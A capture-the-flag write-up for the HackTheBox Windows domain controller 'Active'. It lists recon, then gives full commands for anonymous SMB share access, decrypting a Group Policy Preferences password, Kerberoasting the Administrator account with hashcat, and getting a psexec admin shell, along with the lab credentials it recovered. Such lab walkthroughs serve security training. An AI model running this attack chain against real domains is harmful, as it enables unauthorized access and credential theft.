# Active

| Key | Value |
|-----|-------|
| Platform | HackTheBox |
| OS | Windows |
| Difficulty | Medium |

## Recon

```
10.10.10.100

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
```

## Exploitation

Anonymous access to Replication share:

```bash
smbclient //10.10.10.100/Replication -N
```

Found Groups.xml with GPP encrypted password:

```bash
sudo mount -t cifs //10.10.10.100/Replication /mnt/Replication -o guest
grep -R cpassword /mnt/Replication
```

Decrypt GPP password:

```bash
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
# GPPstillStandingStrong2k18
```

Creds: `active.htb\SVC_TGS : GPPstillStandingStrong2k18`

```bash
smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
```

## Privilege Escalation

Kerberoasting - request TGS for Administrator:

```bash
impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS:GPPstillStandingStrong2k18 -outputfile tgs.hash
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
# Ticketmaster1968
```

Admin shell:

```bash
impacket-psexec active.htb/Administrator:Ticketmaster1968@10.10.10.100
```
